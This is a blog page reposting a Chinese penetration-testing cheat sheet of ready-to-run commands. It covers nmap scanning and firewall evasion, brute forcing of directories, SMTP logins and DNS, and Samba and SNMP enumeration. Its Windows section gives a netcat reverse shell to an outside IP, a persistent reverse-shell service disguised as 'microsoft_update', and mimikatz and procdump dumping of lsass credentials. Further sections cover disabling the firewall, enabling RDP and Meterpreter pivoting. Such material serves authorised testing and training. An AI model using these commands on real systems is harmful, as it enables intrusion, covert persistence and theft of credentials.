<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>渗透测试实战技巧 | 博世的个人博客</title><meta name="keywords" content="技巧"><meta name="author" content="bosch"><meta name="copyright" content="bosch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转载于https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;105524.html 最好的 NMAP 扫描策略12345678910111213141516171819202122232425262728# 适用所有大小网络最好的 nmap 扫描策略# 主机发现，生成存活主机列表$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0&#x2F;24$ gre">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试实战技巧">
<meta property="og:url" content="https://ckcah.github.io/2020/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7/index.html">
<meta property="og:site_name" content="博世的个人博客">
<meta property="og:description" content="转载于https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;105524.html 最好的 NMAP 扫描策略12345678910111213141516171819202122232425262728# 适用所有大小网络最好的 nmap 扫描策略# 主机发现，生成存活主机列表$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0&#x2F;24$ gre">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.pinimg.com/236x/7e/f4/e1/7ef4e177d194f9d8b9c7df1375319f14.jpg">
<meta property="article:published_time" content="2020-05-10T13:16:00.000Z">
<meta property="article:modified_time" content="2022-05-01T08:39:46.875Z">
<meta property="article:author" content="bosch">
<meta property="article:tag" content="技巧">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.pinimg.com/236x/7e/f4/e1/7ef4e177d194f9d8b9c7df1375319f14.jpg"><link rel="shortcut icon" href="https://ckcah.github.io/images/cat.jpg"><link rel="canonical" href="https://ckcah.github.io/2020/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1fc9630d700c25378bbd9cc7b83ea3a4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-XDVEQ9NLN8"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XDVEQ9NLN8');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"GUYXF2H6BD","apiKey":"c0d60afba1b4290f43971634820e4275","indexName":"ckcah","hits":{"per_page":6},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '渗透测试实战技巧',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-01 16:39:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/video.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://ckcah.github.io/images/title1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">21</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fa fa-book"></i><span> Books</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.pinimg.com/236x/7e/f4/e1/7ef4e177d194f9d8b9c7df1375319f14.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">博世的个人博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fa fa-book"></i><span> Books</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试实战技巧</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-10T13:16:00.000Z" title="Created 2020-05-10 21:16:00">2020-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-01T08:39:46.875Z" title="Updated 2022-05-01 16:39:46">2022-05-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7,091</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>38min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透测试实战技巧"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>转载于<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/105524.html">https://www.freebuf.com/sectool/105524.html</a></strong></p>
<h3 id="最好的-NMAP-扫描策略"><a href="#最好的-NMAP-扫描策略" class="headerlink" title="最好的 NMAP 扫描策略"></a>最好的 NMAP 扫描策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 适用所有大小网络最好的 nmap 扫描策略</span><br><span class="line"></span><br><span class="line"># 主机发现，生成存活主机列表</span><br><span class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</span><br><span class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &#x27; &#x27; &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 端口发现，发现大部分常用端口</span><br><span class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span><br><span class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</span><br><span class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 显示 TCP\UDP 端口</span><br><span class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &#x27; &#x27; | sort -nu | cut -f 1 -d &#x27;/&#x27; |xargs | sed &#x27;s/ /,/g&#x27;|awk &#x27;&#123;print &quot;T:&quot;$0&#125;&#x27;</span><br><span class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &#x27; &#x27; | sort -nu | cut -f 1 -d &#x27;/&#x27; |xargs | sed &#x27;s/ /,/g&#x27;|awk &#x27;&#123;print &quot;U:&quot;$0&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 侦测服务版本</span><br><span class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 扫做系统扫描</span><br><span class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"># 系统和服务检测</span><br><span class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-–-躲避防火墙"><a href="#Nmap-–-躲避防火墙" class="headerlink" title="Nmap – 躲避防火墙"></a>Nmap – 躲避防火墙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 分段</span><br><span class="line">$ nmap -f</span><br><span class="line"></span><br><span class="line"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</span><br><span class="line">$ nmap --mtu 24</span><br><span class="line"></span><br><span class="line"># 生成随机数量的欺骗</span><br><span class="line">$ nmap -D RND:10 [target]</span><br><span class="line"></span><br><span class="line"># 手动指定欺骗使用的 IP</span><br><span class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</span><br><span class="line"></span><br><span class="line"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span><br><span class="line">$ nmap -sI [Zombie IP] [Target IP]</span><br><span class="line"></span><br><span class="line"># 指定源端口号</span><br><span class="line">$ nmap --source-port 80 IP</span><br><span class="line"></span><br><span class="line"># 在每个扫描数据包后追加随机数量的数据</span><br><span class="line">$ nmap --data-length 25 IP</span><br><span class="line"></span><br><span class="line"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</span><br><span class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/nmap/scripts/</span><br><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure>

<h3 id="使用-DIRB-爆破目录"><a href="#使用-DIRB-爆破目录" class="headerlink" title="使用 DIRB 爆破目录"></a>使用 DIRB 爆破目录</h3><p>注：<a target="_blank" rel="noopener" href="http://dirb.sourceforge.net/">DIRB</a> 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的<a target="_blank" rel="noopener" href="https://github.com/lanjelot/patator">patator</a>，<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>，<a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a>， 国内的御剑等等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>

<h3 id="Patator-–-全能暴力破解测试工具"><a href="#Patator-–-全能暴力破解测试工具" class="headerlink" title="Patator – 全能暴力破解测试工具"></a>Patator – 全能暴力破解测试工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span><br><span class="line"></span><br><span class="line"># SMTP 爆破</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 helo=&#x27;ehlo 192.168.17.128&#x27; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&#x27;incorrect password or account name&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="使用-Fierce-爆破-DNS"><a href="#使用-Fierce-爆破-DNS" class="headerlink" title="使用 Fierce 爆破 DNS"></a>使用 Fierce 爆破 DNS</h3><p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a> 和 <a target="_blank" rel="noopener" href="https://github.com/TheRook/subbrute/">SubBrute</a> 等等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># http://ha.ckers.org/fierce/</span><br><span class="line">$ ./fierce.pl -dns example.com</span><br><span class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-Nikto-扫描-Web-服务"><a href="#使用-Nikto-扫描-Web-服务" class="headerlink" title="使用 Nikto 扫描 Web 服务"></a>使用 Nikto 扫描 Web 服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -C all -h http://IP</span><br></pre></td></tr></table></figure>

<h3 id="扫描-WordPress"><a href="#扫描-WordPress" class="headerlink" title="扫描 WordPress"></a>扫描 WordPress</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan</span><br><span class="line">./wpscan –url http://IP/ –enumerate p</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span><br><span class="line">cd httprint_301/linux/</span><br><span class="line">./httprint -h http://IP -s signatures.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-Skipfish-扫描"><a href="#使用-Skipfish-扫描" class="headerlink" title="使用 Skipfish 扫描"></a>使用 Skipfish 扫描</h3><p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</span><br></pre></td></tr></table></figure>

<h3 id="使用-NC-扫描"><a href="#使用-NC-扫描" class="headerlink" title="使用 NC 扫描"></a>使用 NC 扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v -w 1 target -z 1-1000</span><br><span class="line">for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</span><br></pre></td></tr></table></figure>

<h3 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h3><p>注：<a target="_blank" rel="noopener" href="http://www.unicornscan.org/">Unicornscan</a> 是一个信息收集和安全审计的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</span><br><span class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</span><br><span class="line"></span><br><span class="line">-H 在生成报告阶段解析主机名</span><br><span class="line">-m 扫描类型 (sf - tcp, U - udp)</span><br><span class="line">-Iv - 详细</span><br></pre></td></tr></table></figure>

<h3 id="使用-Xprobe2-识别操作系统指纹"><a href="#使用-Xprobe2-识别操作系统指纹" class="headerlink" title="使用 Xprobe2 识别操作系统指纹"></a>使用 Xprobe2 识别操作系统指纹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xprobe2 -v -p tcp:80:open IP</span><br></pre></td></tr></table></figure>

<h3 id="枚举-Samba"><a href="#枚举-Samba" class="headerlink" title="枚举 Samba"></a>枚举 Samba</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure>

<h3 id="枚举-SNMP"><a href="#枚举-SNMP" class="headerlink" title="枚举 SNMP"></a>枚举 SNMP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpget -v 1 -c public IP</span><br><span class="line">snmpwalk -v 1 -c public IP</span><br><span class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</span><br></pre></td></tr></table></figure>

<h3 id="实用的-Windows-cmd-命令"><a href="#实用的-Windows-cmd-命令" class="headerlink" title="实用的 Windows cmd 命令"></a>实用的 Windows cmd 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Users</span><br><span class="line">net localgroup Administrators</span><br><span class="line">search dir/s *.doc</span><br><span class="line">system(&quot;start cmd.exe /k $cmd&quot;)</span><br><span class="line">sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore</span><br><span class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统</span><br></pre></td></tr></table></figure>

<h3 id="PuTTY-连接隧道"><a href="#PuTTY-连接隧道" class="headerlink" title="PuTTY 连接隧道"></a>PuTTY 连接隧道</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转发远程端口到目标地址</span><br><span class="line">plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</span><br></pre></td></tr></table></figure>

<h3 id="Meterpreter-端口转发"><a href="#Meterpreter-端口转发" class="headerlink" title="Meterpreter 端口转发"></a>Meterpreter 端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span><br><span class="line"># 转发远程端口到目标地址</span><br><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141</span><br><span class="line">kali &gt; rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure>

<h3 id="开启-RDP-服务"><a href="#开启-RDP-服务" class="headerlink" title="开启 RDP 服务"></a>开启 RDP 服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</span><br><span class="line">netsh firewall set service remoteadmin enable</span><br><span class="line">netsh firewall set service remotedesktop enable</span><br></pre></td></tr></table></figure>

<h3 id="关闭-Windows-防火墙"><a href="#关闭-Windows-防火墙" class="headerlink" title="关闭 Windows 防火墙"></a>关闭 Windows 防火墙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>

<h3 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span><br><span class="line">run getgui -u admin -p 1234</span><br><span class="line">run vnc -p 5043</span><br></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz"><a href="#使用-Mimikatz" class="headerlink" title="使用 Mimikatz"></a>使用 Mimikatz</h3><p>获取 Windows 明文用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gentilkiwi/mimikatz.git</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

